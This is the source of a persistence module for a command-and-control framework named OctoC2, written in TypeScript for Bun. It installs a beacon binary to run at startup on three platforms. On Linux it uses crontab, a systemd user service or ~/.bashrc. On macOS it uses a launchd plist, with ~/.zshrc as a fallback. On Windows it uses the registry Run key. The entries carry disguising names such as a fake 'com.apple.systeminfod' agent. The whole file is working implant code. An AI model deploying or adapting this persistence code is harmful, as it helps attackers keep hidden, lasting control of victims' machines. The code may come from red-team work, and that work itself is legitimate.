#!/usr/bin/env bun
/**
 * OctoC2 persist module — real persistence implementation.
 *
 * Installs the beacon binary as a persistent startup entry.
 * Method priority:
 *   Linux  : crontab @reboot → systemd user service → ~/.bashrc append
 *   macOS  : launchd plist (~Library/LaunchAgents) → cron → ~/.zshrc append
 *   Windows: Registry HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 *
 * The beacon binary path is resolved from the parent PID (SVC_PID).
 *
 * Output: single JSON line on stdout.
 * Fields: beaconId, status ("installed"|"already_present"|"failed"), platform,
 *         method, binaryPath, message, collectedAt
 *
 * Compile:
 *   octoctl module build persist --beacon <id> \
 *     --source ./modules/persist.ts --server-url <url>
 */

import { execSync, spawnSync } from "node:child_process";
import { existsSync, readFileSync, writeFileSync, mkdirSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";

const TIMEOUT_MS = 10_000;

// ── Resolve beacon binary path ────────────────────────────────────────────────

function resolveBeaconPath(): string | null {
  const parentPid = process.env["SVC_PID"];
  if (!parentPid) return null;

  try {
    if (process.platform === "linux") {
      // /proc/{pid}/exe is a symlink to the executable
      const linkTarget = execSync(`readlink -f /proc/${parentPid}/exe`, {
        encoding: "utf8", timeout: 3_000,
      }).trim();
      if (linkTarget && existsSync(linkTarget)) return linkTarget;
    }
    if (process.platform === "darwin") {
      const out = execSync(
        `ps -p ${parentPid} -o comm=`,
        { encoding: "utf8", timeout: 3_000 }
      ).trim();
      if (out && existsSync(out)) return out;
    }
    if (process.platform === "win32") {
      const out = execSync(
        `wmic process where ProcessId=${parentPid} get ExecutablePath /value`,
        { encoding: "utf8", timeout: 5_000 }
      );
      const m = out.match(/ExecutablePath=(.+)/);
      if (m && m[1]) return m[1]!.trim();
    }
  } catch { /* fall through */ }

  return null;
}

// ── Persistence methods ───────────────────────────────────────────────────────

interface PersistResult {
  status:  "installed" | "already_present" | "failed";
  method:  string;
  message: string;
}

// Linux: crontab @reboot
function persistCron(binaryPath: string): PersistResult {
  try {
    const existing = execSync("crontab -l 2>/dev/null || true", {
      encoding: "utf8", timeout: TIMEOUT_MS,
    });
    const entry = `@reboot "${binaryPath}"`;
    if (existing.includes(entry)) {
      return { status: "already_present", method: "crontab", message: "crontab entry already present" };
    }
    const newCron = existing.trimEnd() + `\n${entry}\n`;
    const tmp = join(tmpdir(), `svc-cron-${Date.now()}`);
    writeFileSync(tmp, newCron);
    const r = spawnSync("crontab", [tmp], { timeout: TIMEOUT_MS });
    if (r.status !== 0) return { status: "failed", method: "crontab", message: `crontab install failed: ${r.stderr?.toString().trim()}` };
    return { status: "installed", method: "crontab", message: `@reboot entry installed` };
  } catch (e) {
    return { status: "failed", method: "crontab", message: (e as Error).message };
  }
}

// Linux: systemd user service
function persistSystemdUser(binaryPath: string): PersistResult {
  try {
    const serviceDir = join(homedir(), ".config", "systemd", "user");
    const servicePath = join(serviceDir, "svc-agent.service");
    if (existsSync(servicePath)) {
      return { status: "already_present", method: "systemd-user", message: "service file already present" };
    }
    mkdirSync(serviceDir, { recursive: true });
    const unit = [
      "[Unit]",
      "Description=System Infrastructure Agent",
      "After=network.target",
      "",
      "[Service]",
      "Type=simple",
      `ExecStart=${binaryPath}`,
      "Restart=on-failure",
      "RestartSec=30",
      "",
      "[Install]",
      "WantedBy=default.target",
    ].join("\n");
    writeFileSync(servicePath, unit);
    spawnSync("systemctl", ["--user", "--quiet", "enable", "svc-agent.service"], { timeout: TIMEOUT_MS });
    return { status: "installed", method: "systemd-user", message: `service file written to ${servicePath}` };
  } catch (e) {
    return { status: "failed", method: "systemd-user", message: (e as Error).message };
  }
}

// Linux fallback: ~/.bashrc append
function persistBashrc(binaryPath: string): PersistResult {
  const rcPath = join(homedir(), ".bashrc");
  const entry  = `\n# Infrastructure agent\n[ -x "${binaryPath}" ] && "${binaryPath}" &\n`;
  try {
    const existing = existsSync(rcPath) ? readFileSync(rcPath, "utf8") : "";
    if (existing.includes(binaryPath)) {
      return { status: "already_present", method: "~/.bashrc", message: "bashrc entry already present" };
    }
    writeFileSync(rcPath, existing + entry);
    return { status: "installed", method: "~/.bashrc", message: `startup snippet appended to ${rcPath}` };
  } catch (e) {
    return { status: "failed", method: "~/.bashrc", message: (e as Error).message };
  }
}

// macOS: launchd plist
function persistLaunchd(binaryPath: string): PersistResult {
  const agentsDir = join(homedir(), "Library", "LaunchAgents");
  const plistPath = join(agentsDir, "com.apple.systeminfod.plist");
  try {
    if (existsSync(plistPath)) {
      return { status: "already_present", method: "launchd", message: "plist already present" };
    }
    mkdirSync(agentsDir, { recursive: true });
    const plist = [
      `<?xml version="1.0" encoding="UTF-8"?>`,
      `<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">`,
      `<plist version="1.0">`,
      `<dict>`,
      `  <key>Label</key><string>com.apple.systeminfod</string>`,
      `  <key>ProgramArguments</key>`,
      `  <array><string>${binaryPath}</string></array>`,
      `  <key>RunAtLoad</key><true/>`,
      `  <key>KeepAlive</key>`,
      `  <dict><key>SuccessfulExit</key><false/></dict>`,
      `</dict>`,
      `</plist>`,
    ].join("\n");
    writeFileSync(plistPath, plist);
    spawnSync("launchctl", ["load", "-w", plistPath], { timeout: TIMEOUT_MS });
    return { status: "installed", method: "launchd", message: `plist written to ${plistPath}` };
  } catch (e) {
    return { status: "failed", method: "launchd", message: (e as Error).message };
  }
}

// macOS fallback: ~/.zshrc
function persistZshrc(binaryPath: string): PersistResult {
  const rcPath = join(homedir(), ".zshrc");
  const entry  = `\n# Infrastructure agent\n[ -x "${binaryPath}" ] && "${binaryPath}" &\n`;
  try {
    const existing = existsSync(rcPath) ? readFileSync(rcPath, "utf8") : "";
    if (existing.includes(binaryPath)) {
      return { status: "already_present", method: "~/.zshrc", message: "zshrc entry already present" };
    }
    writeFileSync(rcPath, existing + entry);
    return { status: "installed", method: "~/.zshrc", message: `startup snippet appended to ${rcPath}` };
  } catch (e) {
    return { status: "failed", method: "~/.zshrc", message: (e as Error).message };
  }
}

// Windows: Registry HKCU Run
function persistRegistry(binaryPath: string): PersistResult {
  const key   = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
  const name  = "SystemInfraAgent";
  try {
    const check = spawnSync("reg", ["query", key, "/v", name], { timeout: TIMEOUT_MS });
    if (check.status === 0) {
      return { status: "already_present", method: "registry-run", message: `${key}\\${name} already present` };
    }
    const add = spawnSync("reg", ["add", key, "/v", name, "/t", "REG_SZ", "/d", binaryPath, "/f"], { timeout: TIMEOUT_MS });
    if (add.status !== 0) {
      return { status: "failed", method: "registry-run", message: `reg add failed: ${add.stderr?.toString().trim()}` };
    }
    return { status: "installed", method: "registry-run", message: `${key}\\${name} set` };
  } catch (e) {
    return { status: "failed", method: "registry-run", message: (e as Error).message };
  }
}

// ── Main ──────────────────────────────────────────────────────────────────────

const binaryPath = resolveBeaconPath();

let result: PersistResult;

if (!binaryPath) {
  result = { status: "failed", method: "none", message: "Could not resolve beacon binary path (SVC_PID not set or /proc unavailable)" };
} else {
  switch (process.platform) {
    case "linux": {
      // Try methods in order, stop at first success or already_present
      const cron = persistCron(binaryPath);
      if (cron.status !== "failed") { result = cron; break; }
      const svc = persistSystemdUser(binaryPath);
      if (svc.status !== "failed") { result = svc; break; }
      result = persistBashrc(binaryPath);
      break;
    }
    case "darwin": {
      const ld = persistLaunchd(binaryPath);
      if (ld.status !== "failed") { result = ld; break; }
      result = persistZshrc(binaryPath);
      break;
    }
    case "win32": {
      result = persistRegistry(binaryPath);
      break;
    }
    default:
      result = { status: "failed", method: "none", message: `Persistence not implemented on ${process.platform}` };
  }
}

const output = {
  beaconId:    process.env["OCTOC2_BEACON_ID"] ?? "unknown",
  status:      result.status,
  platform:    process.platform,
  method:      result.method,
  binaryPath:  binaryPath ?? null,
  message:     result.message,
  collectedAt: new Date().toISOString(),
};

process.stdout.write(JSON.stringify(output) + "\n");
